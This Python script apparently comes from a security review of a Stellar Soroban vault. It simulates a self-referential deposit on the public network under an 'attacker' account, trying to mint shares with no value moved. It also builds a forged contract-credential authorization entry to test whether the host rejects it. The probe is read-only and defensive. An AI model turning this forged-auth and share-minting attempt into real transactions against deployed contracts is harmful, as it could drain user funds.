#!/usr/bin/env python3
"""
Self-referential deposit probe.

`deposit(assets, receiver, from, operator)` calls `operator.require_auth()` and then
`token.transfer(from, vault, assets)` when `operator == from`.  Passing the vault's
own address for both `from` and `operator` would mint shares while moving no value
(vault -> vault transfer).  Whether that is executable depends on whether an external
caller can satisfy `vault.require_auth()` as a top-level contract.

This probe records the requirement, then tests it in enforce mode with a forged
contract-credential auth entry.  The vault exports no `__check_auth`, so the host
must reject the credential.

Read-only: simulateTransaction only.
"""
import json
import sys

sys.path.insert(0, __file__.rsplit("/", 1)[0])
import stellar_checks as sc
from stellar_sdk import scval, xdr as X, TransactionBuilder, Account, Network

V, A = sc.VAULT, sc.ATTACKER
ASSETS = 1_000_000
ARGS = [scval.to_int128(ASSETS), scval.to_address(A), scval.to_address(V), scval.to_address(V)]


def sc_addr(cid):
    return X.SCAddress(
        type=X.SCAddressType.SC_ADDRESS_TYPE_CONTRACT,
        contract_id=X.ContractID(X.Hash(sc.StrKey.decode_contract(cid))),
    )


def forged_vault_auth():
    inv = X.SorobanAuthorizedInvocation(
        function=X.SorobanAuthorizedFunction(
            type=X.SorobanAuthorizedFunctionType.SOROBAN_AUTHORIZED_FUNCTION_TYPE_CONTRACT_FN,
            contract_fn=X.InvokeContractArgs(
                contract_address=sc_addr(V),
                function_name=X.SCSymbol(sc_symbol=b"deposit"),
                args=ARGS,
            ),
        ),
        sub_invocations=[],
    )
    creds = X.SorobanAddressCredentials(
        address=sc_addr(V),
        nonce=X.Int64(0),
        signature_expiration_ledger=X.Uint32(0),
        signature=X.SCVal(type=X.SCValType.SCV_VOID),
    )
    return X.SorobanAuthorizationEntry(
        credentials=X.SorobanCredentials(
            type=X.SorobanCredentialsType.SOROBAN_CREDENTIALS_ADDRESS_V2, address_v2=creds
        ),
        root_invocation=inv,
    )


def main():
    spec = sc.S.get_contract_spec(V)
    names = [f.name.sc_symbol.decode() for f in spec.functions]
    out = {
        "vault": V,
        "has_check_auth_export": "__check_auth" in names,
        "record_self_deposit": sc.simulate(V, "deposit", ARGS, A),
        "record_from_vault_operator_attacker": sc.simulate(
            V,
            "deposit",
            [scval.to_int128(ASSETS), scval.to_address(A), scval.to_address(V), scval.to_address(A)],
            A,
        ),
    }
    seq = sc.account_seq(A)
    tx = (
        TransactionBuilder(Account(A, seq), Network.PUBLIC_NETWORK_PASSPHRASE, 1_000_000)
        .append_invoke_contract_function_op(V, "deposit", ARGS, auth=[forged_vault_auth()])
        .set_timeout(60)
        .build()
    )
    r = sc.S.simulate_transaction(tx, auth_mode="enforce")
    out["enforce_forged_vault_auth"] = {
        "error": (r.error or "").split("\n")[0] if r.error else None,
        "diagnostics": [
            e.to_xdr() if hasattr(e, "to_xdr") else str(e) for e in (r.events or [])
        ][:3],
        "return": sc.scval_to_py(X.SCVal.from_xdr(r.results[0].xdr))
        if (r.results and not r.error)
        else None,
    }
    print(json.dumps(out, indent=1, default=str))
    return out


if __name__ == "__main__":
    main()
